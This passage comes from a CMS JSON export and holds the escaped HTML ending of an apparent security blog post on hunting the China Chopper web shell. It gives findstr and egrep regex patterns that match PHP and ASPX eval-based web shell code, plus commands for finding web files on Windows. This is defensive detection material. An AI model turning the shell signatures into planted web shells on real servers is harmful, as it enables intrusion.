\u003Cem\u003Efindstr\u003C\/em\u003E interprets \u003Cem\u003Eregex\u003C\/em\u003E. The command you would run is as follows:\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003Efindstr \/R \u0022[\u0026lt;][?]php.\\@eval[(]\\$_POST.*[)];[?][\u0026gt;]\u0022 *.php\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EThese examples show detection in the PHP shell. To find the ASPX shell, just modify the \u003Cem\u003Eregex\u003C\/em\u003E to fit the syntax of the ASPX shell as shown:\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003Eegrep -re \u0027[\u0026lt;]\\%\\@\\sPage\\sLanguage=.Jscript.\\%[\u0026gt;][\u0026lt;]\\%eval.Request\\.Item.+unsafe\u0027 *.aspx\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003Efindstr \/R \u0022[\u0026lt;]\\%\\@.Page.Language=.Jscript.\\%[\u0026gt;][\u0026lt;]\\%eval.Request\\.Item.*unsafe\u0022 *.aspx\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EIf you are not sure where all of the PHP or ASPX files are on a Windows host, you can use the \u003Cem\u003Edir\u003C\/em\u003E command with some extended options to help you identify Web files that you may want to run our \u003Cem\u003Eregex\u003C\/em\u003E against (see Figure 12).\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003Edir \/S \/A \/B *.php\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image012.jpg\u0022\u003E\u003Cimg class=\u0022alignnone size-full wp-image-2676 landscape-med\u0022 alt=\u0022image012\u0022 src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image012.jpg\u0022 width=\u0022510\u0022 height=\u0022135\u0022 \/\u003E\u003C\/a\u003E\u003C\/p\u003E\u003Cp\u003EFigure 12: Recursive search through Windows using the \u003Cem\u003Edir\u003C\/em\u003E command\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003E\u003Cem\u003EFindstr\u003C\/em\u003E also has an option to search all subdirectories (see Figure 13).\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003Efindstr \/R \/S \u0022[\u0026lt;][?]php.\\@eval[(]\\$_POST.*[)];[?][\u0026gt;]\u0022 *.php\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image013.jpg\u0022\u003E\u003Cimg class=\u0022alignnone size-full wp-image-2677 landscape-med\u0022 alt=\u0022image013\u0022 src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image013.jpg\u0022 width=\u0022782\u0022 height=\u0022213\u0022 \/\u003E\u003C\/a\u003E\u003C\/p\u003E\u003Cp\u003EFigure 13: Using \u003Cem\u003Efindstr\u003C\/em\u003E to recursively locate multiple instances of the Web shell\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003E\u003Cstrong\u003EConclusion:\u003C\/strong\u003E\u003C\/p\u003E\u003Cp\u003EI hope this explanation of China Chopper\u0027s features,\u00a0platform versatility, delivery mechanisms, traffic analysis, and detection give you the knowledge and tools you need to eradicate this elegantly designed but dangerous menace.\u003C\/p\u003E\u003Cp\u003EGood hunting.\u003C\/p\u003E",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "lynda.hall@fireeye.com",
      "jcr:lastModified": "Fri Jan 26 2018 17:27:05 GMT-0500",
      "imageRotate": "0"
    }
  }
}
